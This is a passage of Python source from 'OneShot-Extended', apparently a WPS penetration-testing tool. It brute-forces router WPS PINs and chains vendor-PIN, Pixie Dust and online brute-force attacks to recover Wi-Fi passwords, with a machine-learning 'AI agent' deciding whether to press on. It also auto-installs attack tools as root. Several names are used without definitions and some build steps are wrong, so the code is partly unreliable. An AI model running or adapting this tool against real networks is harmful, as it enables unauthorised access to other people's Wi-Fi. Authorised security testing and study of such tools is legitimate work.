            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                return self._secondHalfBruteforce(bssid, first_half, second_half)

            second_half = str(int(second_half) + 1).zfill(3)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half + second_half)

            if args.delay:
                time.sleep(args.delay)

        return False

    def smartBruteforce(self, bssid: str, start_pin: str = None):
        """Attempts to bruteforce a WPS PIN."""

        sessions_dir = src.utils.SESSIONS_DIR
        filename = f'''{sessions_dir}{bssid.replace(':', '').upper()}.run'''

        if (not start_pin) or (len(start_pin) < 4):
            try:
                # Trying to restore previous session
                with open(filename, 'r', encoding='utf-8') as file:
                    if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        self.BRUTEFORCE_STATUS.MASK = mask

        try:
            if len(mask) == 4:
                first_half = self._firstHalfBruteforce(bssid, mask)
                if first_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
                    self._secondHalfBruteforce(bssid, first_half, '001')
            elif len(mask) == 7:
                first_half = mask[:4]
                second_half = mask[4:]
                self._secondHalfBruteforce(bssid, first_half, second_half)
            raise KeyboardInterrupt
        except KeyboardInterrupt as e:
            logger.info('Aborting…')

            with open(filename, 'w', encoding='utf-8') as file:
                file.write(self.BRUTEFORCE_STATUS.MASK)
            logger.info(f'Session saved in {filename}')

            if args.loop:
                raise KeyboardInterrupt from e


# ============================================================================
# SOURCE: ose.py
# ============================================================================
#!/usr/bin/env python3

#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import os
import sys

# pylint: disable=wrong-import-position
if sys.version_info < (3, 10):
    sys.exit('Python 3.10 or higher is required to run this script.')

from shutil import which
from pathlib import Path
from src import logger

import src.wifi.android
import src.wifi.scanner
import src.wps.connection
import src.wps.bruteforce
import src.utils
import src.args

def _install_system_deps():
    """Auto-install missing system dependencies (pixiewps, reaver, iw, etc.)."""
    import subprocess

    print('[*] Checking system dependencies...')

    pkgs_apt = ['pixiewps', 'reaver', 'bully', 'hostapd-wpe', 'iw', 'wpasupplicant',
                'build-essential', 'libpcap-dev', 'libnl-3-dev', 'libnl-genl-3-dev']

    # Check what's missing
    missing = []
    for pkg in ['pixiewps', 'reaver', 'bully', 'iw']:
        if not which(pkg):
            missing.append(pkg)

    if not missing:
        print('[+] All core tools found')
        return

    print(f'[*] Missing: {", ".join(missing)}')
    print('[*] Installing via apt...')

    # Update package list
    subprocess.run(['apt-get', 'update', '-qq'], capture_output=True, timeout=120)

    # Install each missing tool
    for pkg in missing:
        print(f'[*] Installing {pkg}...')
        try:
            r = subprocess.run(
                ['apt-get', 'install', '-y', '-qq', pkg],
                capture_output=True, text=True, timeout=120
            )
            if r.returncode == 0:
                print(f'[+] {pkg} installed')
            else:
                print(f'[!] {pkg} apt install failed, trying source build...')
                _build_from_source(pkg)
        except Exception as e:
            print(f'[!] {pkg} install error: {e}')
            _build_from_source(pkg)

def _build_from_source(tool):
    """Build a tool from source if apt fails."""
    import subprocess

    builds = {
        'pixiewps': {
            'repo': 'https://github.com/wiire-a/pixiewps.git',
            'dir': '/tmp/pixiewps_build',
            'cmd': ['make', 'install'],
        },
        'reaver': {
            'repo': 'https://github.com/t6x/reaver-wps-fork-t6x.git',
            'dir': '/tmp/reaver_build',
            'cmd': ['./configure', '&&', 'make', 'install'],
        },
        'bully': {
            'repo': 'https://github.com/aanarchyy/bully.git',
            'dir': '/tmp/bully_build',
            'cmd': ['make', 'install'],
        },
    }

    if tool not in builds:
        print(f'[!] No source build recipe for {tool}')
        return

    info = builds[tool]
    print(f'[*] Building {tool} from source...')

    try:
        subprocess.run(['git', 'clone', '--depth=1', info['repo'], info['dir']],
                       capture_output=True, timeout=60)
        # Simple build: make && make install
        subprocess.run(['make', '-C', info['dir']], capture_output=True, timeout=120)
        subprocess.run(['make', '-C', info['dir']], capture_output=True, timeout=60)
        print(f'[+] {tool} built from source')
    except Exception as e:
        print(f'[!] {tool} build failed: {e}')
        print(f'[!] Install {tool} manually: https://github.com/wiire-a/{tool}')

def checkRequirements():
    """Verify requirements are met, auto-install if missing."""

    if os.getuid() != 0:
        src.utils.die('Run it as root')

    # Auto-install missing system dependencies
    _install_system_deps()

    # Re-check after install
    required_binaries = ['pixiewps', 'wpa_supplicant', 'iw', 'ip']
    missing = [b for b in required_binaries if not which(b)]

    if missing:
        print(f'[!] Still missing after install: {", ".join(missing)}')
        print(f'[!] Install manually: apt-get install {" ".join(missing)}')
        src.utils.die(f"Missing required utilities: {', '.join(missing)}")

def setupDirectories():
    """Create required directories"""

    # We recently changed the PIXIEWPS_DIR and SESSIONS_DIR path
    # Rename older .OSE data dir to .OneShot-Extended, and maintain compatibility
    old_dir = os.path.expanduser('~/.OSE')
    new_dir = os.path.expanduser('~/.OneShot-Extended')

    if os.path.exists(old_dir):
        try:
            os.rename(old_dir, new_dir)
            logger.info('Renamed legacy data directory')
        except OSError as e:
            logger.error(f'Failed to rename data directory: {e}')

    for directory in [src.utils.SESSIONS_DIR, src.utils.PIXIEWPS_DIR, AIAgent._DIR]:
        if not os.path.exists(directory):
            os.makedirs(directory)

def setupAndroidWifi(android_network: src.wifi.android.AndroidNetwork, enable: bool = False):
    """Configure Android-specific WiFi settings"""

    if enable:
        android_network.enableWifi()
    else:
        android_network.storeAlwaysScanState()
        android_network.disableWifi()

def setupMediatekWifi(wmt_wifi_device: Path):
    """Initialize MediaTek WiFi dev"""

    if not wmt_wifi_device.is_char_device():
        src.utils.die('Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): '
                     '/dev/wmtWifi does not exist or it is not a character device')

    wmt_wifi_device.chmod(0o644)
    wmt_wifi_device.write_text('1', encoding='utf-8')


# ---------------------------------------------------------------------------
# Auto-dependency installer — ensures Python ML packages at startup
# ---------------------------------------------------------------------------

def _ensure_ml_deps():
    """Inspect and auto-install missing Python ML packages (scikit-learn, numpy, joblib).

    Runs silently at startup. If installation fails (no internet, restricted env),
    the script continues — AIAgent degrades to rule-based heuristic.
    """

    required = [
        ('sklearn', 'scikit-learn'),
        ('numpy',   'numpy'),
        ('joblib',  'joblib'),
    ]

    missing = []
    for mod, pkg in required:
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)

    if not missing:
        return

    logger.info(f'[AI] Missing Python packages: {", ".join(missing)} — installing...')

    import subprocess
    try:
        result = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '--break-system-packages', '-q'] + missing,
            capture_output=True, timeout=120,
        )
        if result.returncode == 0:
            logger.success(f'[AI] Installed: {", ".join(missing)}')
        else:
            logger.warning(f'[AI] pip install failed (rc={result.returncode}) — using rule-based fallback')
    except Exception as exc:
        logger.warning(f'[AI] pip install failed ({exc}) — using rule-based fallback')


# ---------------------------------------------------------------------------
# AI Agent — hybrid RF + Q-Learning + SGD ensemble
# ---------------------------------------------------------------------------

class AIAgent:
    """Advanced ML agent for WPS attack optimization.

    Hybrid ensemble of three learners:

    1. **Random Forest** (batch) — trained on accumulated observations every N
       steps.  Provides a stable, high-quality vote.
    2. **SGD Classifier** (online) — updated via ``partial_fit`` after *every*
       single observation so the agent adapts in real-time.
    3. **Q-Learning table** (reinforcement) — a tabular RL component that
       accumulates reward signals across discretized state-action pairs.

    The three votes are combined with weights (RF 0.4, SGD 0.3, Q 0.3).  When
    ML libraries are unavailable the agent silently falls back to pure
    rule-based heuristics — zero functionality is lost.

    Persistence: model weights + Q-table + observation buffer are saved to
    ``~/.OneShot-Extended/`` via joblib / pickle.  Total size stays well under
    50 MB.
    """

    _DIR    = os.path.join(os.path.expanduser('~'), '.OneShot-Extended')
    _MODEL  = os.path.join(_DIR, 'ai_agent.joblib')
    _DATA   = os.path.join(_DIR, 'ai_data.pkl')
    _QTAB   = os.path.join(_DIR, 'ai_qtable.pkl')
    _TRAIN  = os.path.join(_DIR, 'training_log.json')   # per-user training record
    _USERS  = os.path.join(_DIR, 'users.json')          # aggregated user stats

    _FEATS = [
        'signal', 'wps_ver', 'wps_locked', 'is_vuln',
        'attempt', 'timeouts', 'resp_delay', 'm_msgs',
        'fails', 'sig_ok', 'oui', 'frame_loss', 'hist_locks',
    ]

    ACTIONS = ('proceed', 'wait', 'skip', 'abort')

    # --- Improvement 8a: RL hyper-parameters tuned ---
    _Q_ALPHA = 0.1    # learning rate
    _Q_GAMMA = 0.95   # discount factor (future rewards matter more)
    _MAX_OBS = 5000   # improvement 1: much larger observation buffer

    # --- Improvement 6: exploration / exploitation ---
    _EPSILON_BASE = 0.30

    # --- Improvement 9: dual-persona A/B profiles ---
    PROFILES = {
        'conservative': {'epsilon': 0.10, 'q_alpha': 0.08, 'rf_trees': 50, 'sgd_eta': 'optimal'},
        'balanced':     {'epsilon': 0.30, 'q_alpha': 0.10, 'rf_trees': 50, 'sgd_eta': 'optimal'},
        'aggressive':   {'epsilon': 0.55, 'q_alpha': 0.15, 'rf_trees': 50, 'sgd_eta': 'optimal'},
    }
    _DEFAULT_PROFILE = 'balanced'

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def __init__(self, profile: str = None, quiet: bool = False):
        self.has_ml    = False
        self.rf_model  = None          # RandomForestClassifier (batch)
        self.sgd_model = None          # SGDClassifier (online partial_fit)
        self.q_table:  dict[str, dict[str, float]] = {}
        self._seen_eids: set = set()   # event_id dedup (plan §24,27)

        self.X:             list[list[float]] = []
        self.y:             list[str]          = []
        self.reward_history: list[float]       = []

        # --- Improvement 9: A/B profile selection ---
        self.profile  = (profile or self._DEFAULT_PROFILE) if profile in self.PROFILES else self._DEFAULT_PROFILE
        self._cfg     = self.PROFILES[self.profile]
        self._epsilon = self._cfg['epsilon']
        self._Q_ALPHA = self._cfg['q_alpha']
        self._Q_GAMMA = self._Q_GAMMA  # keep tuned discount

        # --- Improvement 10: per-user training log ---
        self.user_id  = self._user_id()
        self._load_training_log()

        try:
            import sklearn.ensemble       # noqa: F401
            import sklearn.linear_model   # noqa: F401
            import numpy                  # noqa: F401
            import joblib                 # noqa: F401
            self.has_ml = True
        except ImportError:
            pass

        self._load()

        if len(self.X) < 5:
            self._pretrain()

        if not quiet:
            logger.info(f'[AI] {self.status()}')

    # ------------------------------------------------------------------
    # Improvement 10: per-user training collection
    # ------------------------------------------------------------------

    @staticmethod
    def _user_id() -> str:
        """Stable per-machine id (no PII, just a hash of hostname + user)."""
        try:
            import hashlib, getpass, socket
            src = f'{getpass.getuser()}@{socket.gethostname()}'
            return hashlib.sha1(src.encode()).hexdigest()[:12]
        except Exception:
            return 'local'

    def _load_training_log(self):
        self.training_log: list[dict] = []
        if os.path.exists(self._TRAIN):
            try:
                with open(self._TRAIN, 'r') as f:
                    self.training_log = json.load(f)
            except Exception:
                self.training_log = []

    def _append_training_log(self, entry: dict):
        entry.setdefault('pushed', False)   # not yet uploaded to Supabase
        self.training_log.append(entry)
        self.training_log = self.training_log[-2000:]
        try:
            with open(self._TRAIN, 'w') as f:
                json.dump(self.training_log, f)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Persistence
    # ------------------------------------------------------------------

    def _load(self):
        # Try bundled models/ directory first (ships with repo)
        _script_dir = os.path.dirname(os.path.abspath(__file__))
        _bundled_model = os.path.join(_script_dir, 'models', 'ai_agent.joblib')
        _bundled_data  = os.path.join(_script_dir, 'models', 'ai_data.pkl')
        _bundled_qtab  = os.path.join(_script_dir, 'models', 'ai_qtable.pkl')

        data_src  = _bundled_data  if os.path.exists(_bundled_data)  else self._DATA
        model_src = _bundled_model if os.path.exists(_bundled_model) else self._MODEL
        qtab_src  = _bundled_qtab  if os.path.exists(_bundled_qtab)  else self._QTAB

        # Safe rollback: if the live model is corrupt, fall back to previous (plan §25)
        if not os.path.exists(model_src) and os.path.exists(self._MODEL + '.prev'):
            model_src = self._MODEL + '.prev'
        if not os.path.exists(data_src) and os.path.exists(self._DATA + '.prev'):
            data_src = self._DATA + '.prev'

        if os.path.exists(data_src):
            try:
                import pickle
                with open(data_src, 'rb') as fh:
                    d = pickle.load(fh)
                self.X             = d.get('X', [])
                self.y             = d.get('y', [])
                self.reward_history = d.get('rewards', [])
            except Exception:
                pass

        if self.has_ml and os.path.exists(model_src):
            try:
                import joblib
                blob = joblib.load(model_src)
                self.rf_model  = blob.get('rf')
                self.sgd_model = blob.get('sgd')
            except Exception:
                pass

        if os.path.exists(qtab_src):
            try:
                import pickle
                with open(qtab_src, 'rb') as fh:
                    self.q_table = pickle.load(fh)
            except Exception:
                pass

        if self.has_ml and self.rf_model is None and len(self.X) >= 20:
            self._train_rf()
        if self.has_ml and self.sgd_model is None and len(self.X) >= 10:
            self._init_sgd()

    def _save(self):
        try:
            os.makedirs(self._DIR, exist_ok=True)

            import pickle, joblib
            # Atomic write: write to .tmp, validate, then rename (plan §24)
            tmp_data = self._DATA + '.tmp'
            tmp_model = self._MODEL + '.tmp'
            tmp_qtab = self._QTAB + '.tmp'

            with open(tmp_data, 'wb') as fh:
                pickle.dump({
                    'X':       self.X[-self._MAX_OBS:],
                    'y':       self.y[-self._MAX_OBS:],
                    'rewards': self.reward_history[-self._MAX_OBS:],
                }, fh)

            if self.has_ml:
                joblib.dump({'rf': self.rf_model, 'sgd': self.sgd_model},
                            tmp_model, compress=3)

            with open(tmp_qtab, 'wb') as fh:
                pickle.dump(self.q_table, fh)

            # Backup previous before swap (plan §25)
            for cur, prev in ((self._DATA, self._DATA + '.prev'),
                              (self._MODEL, self._MODEL + '.prev'),
                              (self._QTAB, self._QTAB + '.prev')):
                if os.path.exists(cur):
                    try:
                        os.replace(cur, prev)
                    except Exception:
                        pass
            # Atomic rename
            os.replace(tmp_data, self._DATA)
            os.replace(tmp_qtab, self._QTAB)
            if self.has_ml and os.path.exists(tmp_model):
                os.replace(tmp_model, self._MODEL)

            # Persist metadata/version (plan §16)
            meta = read_metadata()
            meta = bump_version(meta)
            meta['feature_version'] = 'v1'
            meta['event_count'] = len(self.X)
            meta['training_commit'] = _git_commit() or meta.get('training_commit', '')
            write_metadata(meta)
        except Exception:
            pass

    def finalize(self):
        """Save everything on exit."""
        if self.has_ml and len(self.X) >= 10:
            self._train_rf()
        self._save()

    # ------------------------------------------------------------------
    # Training — RF (batch), SGD (online), Q-table (RL)
    # ------------------------------------------------------------------

    def _train_rf(self):
        if not self.has_ml or len(self.X) < 10:
            return
        import numpy as np
        from sklearn.ensemble import RandomForestClassifier

        X = np.array(self.X[-self._MAX_OBS:])
        y = np.array(self.y[-self._MAX_OBS:])

        for cls in self.ACTIONS:
            if cls not in y:
                X = np.vstack([X, np.zeros((1, len(self._FEATS)))])
                y = np.append(y, cls)

        # Improvement 8a: more trees, more depth for stronger batch model
        self.rf_model = RandomForestClassifier(
            n_estimators=self._cfg['rf_trees'], max_depth=10, random_state=42,
            min_samples_leaf=2, n_jobs=-1,
        )
        self.rf_model.fit(X, y)

    def _init_sgd(self):
        if not self.has_ml or len(self.X) < 5:
            return
        import numpy as np
        from sklearn.linear_model import SGDClassifier

        X = np.array(self.X[-2000:])
        y = np.array(self.y[-2000:])

        classes = list(self.ACTIONS)
        for cls in np.unique(y):
            if cls not in classes:
                classes.append(cls)

        if len(np.unique(y)) < 2:
            return  # Need at least 2 classes for SGD

        # Improvement 8b: slower learning rate = more stable online learning
        self.sgd_model = SGDClassifier(loss='log_loss', random_state=42,
                                       learning_rate=self._cfg.get('sgd_eta', 'optimal'),
                                       eta0=0.001)
        self.sgd_model.fit(X, y)

    def _online_fit(self, feat: list[float], label: str):
        """SGD partial_fit — one observation at a time."""
        if not self.has_ml:
            return
        import numpy as np

        X = np.array([feat])
        y = np.array([label])

        if self.sgd_model is None:
            from sklearn.linear_model import SGDClassifier
            self.sgd_model = SGDClassifier(loss='log_loss', random_state=42,
                                           learning_rate=self._cfg.get('sgd_eta', 'optimal'),
                                           eta0=0.001)
            self.sgd_model.fit(X, y)
        else:
            try:
                self.sgd_model.partial_fit(X, y)
            except Exception:
                self.sgd_model.fit(X, y)

    def _pretrain(self):
        """Generate ~200 synthetic samples from domain knowledge for cold start."""
        import random
        random.seed(42)

        base = {
            'bssid': '00:00:00:00:00:00', 'signal': -50,
            'wps_version': '2.0', 'wps_locked': False,
            'is_vulnerable': False, 'attempt': 1,
            'timeouts': 0, 'resp_delay': 2.0,
            'm_msgs': 3, 'fails': 0, 'hist_locks': 0,
        }

        rules = [
            ({'signal': -45, 'm_msgs': 4, 'fails': 0},                              'proceed', 30),
            ({'signal': -55, 'is_vulnerable': True, 'm_msgs': 3},                    'proceed', 25),
            ({'wps_locked': True, 'fails': 0},                                        'wait',    20),
            ({'signal': -80, 'timeouts': 5, 'm_msgs': 0, 'fails': 5},               'abort',   25),
            ({'signal': -60, 'timeouts': 1, 'm_msgs': 2},                            'proceed', 15),
            ({'signal': -80, 'timeouts': 3, 'm_msgs': 0, 'fails': 3},               'skip',    20),
            ({'signal': -60, 'm_msgs': 0, 'fails': 0},                               'proceed', 25),
            ({'signal': -65, 'timeouts': 2, 'm_msgs': 0, 'fails': 4},               'abort',   20),
            ({'signal': -50, 'wps_locked': True, 'is_vulnerable': True},              'wait',    15),
            ({'signal': -70, 'attempt': 1, 'm_msgs': 0, 'fails': 0, 'hist_locks': 2},'proceed', 10),
        ]

        for overrides, label, count in rules:
            for _ in range(count):
                ctx = {**base, **overrides, 'attempt': random.randint(1, 5)}
                self.X.append(self.extract(ctx))
                self.y.append(label)

        if self.has_ml:
            self._train_rf()
            self._init_sgd()
        self._save()

    # ------------------------------------------------------------------
    # Feature extraction (13 features)
    # ------------------------------------------------------------------

    @staticmethod
    def _norm_signal(dbm: float) -> float:
        return max(0.0, min(1.0, (dbm + 90) / 50))

    @staticmethod
    def _oui_hash(bssid: str) -> float:
        clean = bssid.replace(':', '').replace('-', '')[:6]
        try:
            return int(clean, 16) / 0xFFFFFF
        except ValueError:
            return 0.5

    def extract(self, ctx: dict) -> list[float]:
        timeouts = ctx.get('timeouts', 0)
        m_msgs   = ctx.get('m_msgs', 0)
        total    = timeouts + m_msgs
        frame_loss = timeouts / total if total > 0 else 0.0

        return [
            self._norm_signal(ctx.get('signal', -50)),            # 0  signal
            1.0 if str(ctx.get('wps_version', '1.0')) == '2.0' else 0.0,  # 1  wps_ver
            1 if ctx.get('wps_locked', False) else 0,             # 2  wps_locked
            1 if ctx.get('is_vulnerable', False) else 0,          # 3  is_vuln
            min(ctx.get('attempt', 1), 20) / 20.0,                # 4  attempt
            min(timeouts, 10) / 10.0,                              # 5  timeouts
            min(ctx.get('resp_delay', 0.0), 30.0) / 30.0,        # 6  resp_delay
            min(m_msgs, 8) / 8.0,                                  # 7  m_msgs
            min(ctx.get('fails', 0), 10) / 10.0,                  # 8  fails
            1.0 if ctx.get('signal', -50) > -70 else 0.0,         # 9  sig_ok
            self._oui_hash(ctx.get('bssid', '00:00:00:00:00:00')),# 10 oui
            frame_loss,                                            # 11 frame_loss
            min(ctx.get('hist_locks', 0), 10) / 10.0,            # 12 hist_locks
        ]

    # ------------------------------------------------------------------
    # Q-Learning helpers
    # ------------------------------------------------------------------

    def _discretize(self, ctx: dict) -> str:
        """Map continuous context to a compact discrete state key.

        Improvement 3: finer granularity — signal in 5 dBm steps,
        timeouts 0..8, messages, fails each broken into smaller buckets.
        """
        sig = ctx.get('signal', -50)
        # 5 dBm buckets from -30 to -90  => 12 buckets
        s   = chr(ord('A') + max(0, min(11, (-min(max(sig, -90), -30) - 30) // 5)))
        l   = 'L' if ctx.get('wps_locked', False) else 'N'
        t   = ctx.get('timeouts', 0)
        t_k = '0' if t == 0 else ('1' if t == 1 else ('2' if t <= 3 else (
            '4' if t <= 5 else '8')))
        m   = ctx.get('m_msgs', 0)
        m_k = '0' if m == 0 else ('1' if m <= 2 else ('3' if m <= 4 else ('6')))
        f   = ctx.get('fails', 0)
        f_k = '0' if f == 0 else ('1' if f <= 2 else ('4' if f <= 6 else ('9')))
        a   = ctx.get('attempt', 1)
        a_k = '1' if a == 1 else ('2' if a <= 3 else ('5' if a <= 10 else ('15')))
        return f'{s}{l}|{t_k}|{m_k}|{f_k}|{a_k}'

    def _q_update(self, state: str, action: str, reward: float, next_state: str):
        for s in (state, next_state):
            if s not in self.q_table:
                self.q_table[s] = {a: 0.0 for a in self.ACTIONS}

        old_q     = self.q_table[state][action]
        max_next  = max(self.q_table[next_state].values())
        new_q     = old_q + self._Q_ALPHA * (reward + self._Q_GAMMA * max_next - old_q)
        self.q_table[state][action] = new_q

    def _q_best(self, state: str) -> str | None:
        if state not in self.q_table:
            return None
        return max(self.q_table[state], key=self.q_table[state].get)

    # ------------------------------------------------------------------
    # Decision — weighted ensemble
    # ------------------------------------------------------------------

    def decide(self, phase: str, ctx: dict) -> str:
        """Return 'proceed', 'wait', 'skip', or 'abort'.

        Improvement 6: epsilon-greedy — with probability epsilon, explore a
        random action; otherwise exploit the weighted ensemble vote.
        """
        import random as _rng
        profile_epsilon = self._epsilon

        # Exploration: try a different action occasionally (but never abort
        # blindly for healthy-looking targets)
        if _rng.random() < profile_epsilon:
            explore_actions = [a for a in self.ACTIONS]
            if ctx.get('signal', -50) > -60 and not ctx.get('wps_locked', False):
                explore_actions = [a for a in explore_actions if a != 'abort']
            return _rng.choice(explore_actions)

        feat = self.extract(ctx)

        if self.has_ml:
            votes: dict[str, float] = {}

            # Vote 1: Random Forest (weight 0.4)
            if self.rf_model is not None:
                try:
                    pred  = self.rf_model.predict([feat])[0]
                    proba = max(self.rf_model.predict_proba([feat])[0])
                    if proba >= 0.3:
                        votes[pred] = votes.get(pred, 0) + 0.4 * proba
                except Exception:
                    pass

            # Vote 2: SGD online classifier (weight 0.3)
            if self.sgd_model is not None:
                try:
                    pred = self.sgd_model.predict([feat])[0]
                    votes[pred] = votes.get(pred, 0) + 0.3
                except Exception:
                    pass

            # Vote 3: Q-Learning table (weight 0.3)
            state  = self._discretize(ctx)
            q_best = self._q_best(state)
            if q_best is not None:
                q_val = self.q_table[state][q_best]
                if q_val > 0:
                    votes[q_best] = votes.get(q_best, 0) + 0.3

            if votes:
                return max(votes, key=votes.get)

        return self._heuristic(feat, phase)

    def _heuristic(self, f: list[float], _phase: str) -> str:
        """Pure rule-based fallback — always available, no ML required."""
        locked   = f[2]
        vuln     = f[3]
        sig_ok   = f[9]
        timeouts = f[5] * 10
        m_msgs   = f[7] * 8
        fails    = f[8] * 10
        attempt  = f[4] * 20
        f_loss   = f[11]

        if locked and fails > 5:
            return 'abort'
        if timeouts >= 3 and m_msgs == 0:
            return 'abort'
        if fails >= 5 and m_msgs == 0:
            return 'abort'
        if f_loss > 0.8 and m_msgs == 0:
            return 'abort'
        if locked:
            return 'wait'
        if attempt <= 1:
            return 'proceed'
        if vuln and attempt <= 5:
            return 'proceed'
        if sig_ok and attempt <= 3:
            return 'proceed'
        if attempt > 3 and m_msgs == 0:
            return 'skip'
        return 'proceed'

    # ------------------------------------------------------------------
    # Online learning — called after every connection attempt
    # ------------------------------------------------------------------

    def record(self, ctx: dict, action: str, success: bool):
        feat  = self.extract(ctx)
        state = self._discretize(ctx)

        # Store observation
        self.X.append(feat)
        self.y.append('proceed' if success else 'skip')

        # Improvement 5: context-aware reward function
        signal   = ctx.get('signal', -50)
        timeouts = ctx.get('timeouts', 0)
        attempt  = ctx.get('attempt', 1)

        if success:
            reward = 1.0 + (0.5 if signal > -50 else 0.0)   # quick success bonus
            reward += max(0.0, 0.3 - attempt * 0.05)          # early-success bonus
        else:
            reward = -0.1 - (0.1 if timeouts >= 3 else 0.0)   # timeout penalty
            reward -= 0.1 if action == 'abort' else 0.0
        reward = round(reward, 3)

        self._q_update(state, action, reward, state)
        self.reward_history.append(reward)

        # Improvement 10: per-user training collection
        self._append_training_log({
            'signal': signal, 'locked': bool(ctx.get('wps_locked', False)),
            'action': action, 'success': bool(success), 'reward': reward,
            'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'quality': quality_score({'signal': signal, 'locked': bool(ctx.get('wps_locked', False)),
                                     'action': action, 'success': bool(success), 'reward': reward}),
        })

        # SGD online partial_fit
        self._online_fit(feat, 'proceed' if success else 'skip')

        # Keep dataset bounded (larger buffer now)
        if len(self.X) > self._MAX_OBS:
            self.X, self.y = self.X[-self._MAX_OBS:], self.y[-self._MAX_OBS:]
        if len(self.reward_history) > self._MAX_OBS:
            self.reward_history = self.reward_history[-self._MAX_OBS:]

        # Periodic RF retrain (more data => every 100)
        if len(self.X) % 100 == 0 and self.has_ml and len(self.X) >= 100:
            self._train_rf()

    # ------------------------------------------------------------------
    # Dynamic timeout prediction
    # ------------------------------------------------------------------

    def predict_timeout(self, base: float, ctx: dict) -> float:
        """Adjust timeout based on signal and history."""
        signal   = ctx.get('signal', -50)
        timeouts = ctx.get('timeouts', 0)
        if signal < -80:
            return base * 1.5
        if signal > -50 and timeouts == 0:
            return base * 0.7
        if timeouts >= 2:
            return base * 0.5
        return base

    def status(self) -> str:
        parts = []
        if self.has_ml and self.rf_model:
            parts.append('RF')
        if self.has_ml and self.sgd_model:
            parts.append('SGD')
        if self.q_table:
            parts.append(f'Q({len(self.q_table)})')
        if not parts:
            parts.append('heuristic')
        return f'AI Agent ready ({", ".join(parts)}, {len(self.X)} obs)'


def scanForNetworks(interface: str, vuln_list: list[str]) -> tuple[str, dict] | None:
    """Scan, and prompt user to select network"""

    scanner = src.wifi.scanner.WiFiScanner(interface, vuln_list)
    return scanner.promptNetwork()

def autoAttack(interface: str, bssid: str, vuln_list_file: str,
               network_info: dict = None, explicit_pin: str = None) -> bool:
    """AI-driven auto-attack: vuln list PIN -> Pixie Dust -> online bruteforce.

    The embedded AIAgent decides at each phase whether to proceed, wait, skip,
    or abort — based on real-time metrics (signal, WPS state, timeouts, etc.).

    Returns True on success (credentials obtained), False otherwise.
    """

    agent     = AIAgent(profile=getattr(args, 'profile', 'balanced'))
    generator = src.wps.generator.WPSpin()

    # Build initial context from scan data
    ctx = {
        'bssid':         bssid,
        'signal':        network_info.get('Level', -50)        if network_info else -50,
        'wps_version':   network_info.get('WPS version', '1.0') if network_info else '1.0',
        'wps_locked':    network_info.get('WPS locked', False)  if network_info else False,
        'is_vulnerable': False,
        'attempt':       1,
        'timeouts':      0,
        'resp_delay':    0.0,
        'm_msgs':        0,
        'fails':         0,
        'hist_locks':    0,
    }

    # ----- Step 1: Vulnerable list -----
    algos = generator._getSuggested(bssid)
    ctx['is_vulnerable'] = len(algos) > 0

    if algos:
        action = agent.decide('vuln_list', ctx)
        logger.info(f'[AI] vuln_list -> {action}')

        if action == 'abort':
            agent.finalize()
            return False

        if action != 'skip':
            connection = src.wps.connection.Initialize(interface)
            for algo in algos:
                pin = algo.get('pin', '')
                if pin:
                    logger.info(f'[AI] Trying PIN \'{pin}\' ({algo["name"]})')
                    success = connection.singleConnection(bssid, pin)
                    cs = connection.CONNECTION_STATUS
                    ctx['m_msgs']   = cs.LAST_M_MESSAGE
                    ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
                    ctx['fails']    = 0 if success else 1
                    agent.record(ctx, 'proceed', success)
                    if success:
                        agent.finalize()
                        return True
            logger.warning('[AI] Vuln list PINs did not succeed')
            try:
                connection._cleanup()
            except Exception:
                pass

    # ----- Step 2: Pixie Dust (offline) -----
    ctx['attempt'] = 2
    action = agent.decide('pixie_dust', ctx)
    logger.info(f'[AI] pixie_dust -> {action}')

    if action == 'abort':
        agent.finalize()
        return False

    if action != 'skip':
        logger.info('[AI] Trying Pixie Dust attack...')
        likely_pin = explicit_pin or generator.getLikely(bssid) or '12345670'
        connection = src.wps.connection.Initialize(interface)

        saved_pixie = args.pixie_dust
        args.pixie_dust = True
        success = connection.singleConnection(bssid, likely_pin)
        cs = connection.CONNECTION_STATUS
        ctx['m_msgs']   = cs.LAST_M_MESSAGE
        ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
        ctx['fails']    = 0 if success else 1
        agent.record(ctx, 'proceed', success)
        args.pixie_dust = saved_pixie

        if success:
            agent.finalize()
            return True

        logger.warning('[AI] Pixie Dust did not recover the PIN')
        try:
            connection._cleanup()
        except Exception:
            pass

    # ----- Step 3: Online bruteforce -----
    ctx['attempt'] = 3
    action = agent.decide('bruteforce', ctx)
    logger.info(f'[AI] bruteforce -> {action}')

    if action == 'abort':
        logger.info('[AI] Skipping bruteforce (low success probability)')
        agent.finalize()
        return False

    logger.info('[AI] Falling back to online bruteforce...')
    bf = src.wps.bruteforce.Initialize(interface)
    bf.smartBruteforce(bssid, '0000')
    agent.finalize()
    return False


def handleConnection(args):
    """Main connection logic"""

    network_info = {}
    success = False

    # Auto mode = no explicit attack flag given
    auto_mode = not (args.pixie_dust or args.bruteforce or args.pin
                     or args.null_pin or args.pbc)

    if args.bruteforce:
        connection = src.wps.bruteforce.Initialize(args.interface)
    else:
        connection = src.wps.connection.Initialize(args.interface)

    if args.pbc:
        connection.singleConnection(pbc_mode=True)
    else:
        if not args.bssid:
            try:
                with open(args.vuln_list, 'r', encoding='utf-8') as file:
                    vuln_list = file.read().splitlines()
            except FileNotFoundError:
                vuln_list = []

            if not args.loop:
                logger.info('BSSID not specified (--bssid) — scanning for available networks')

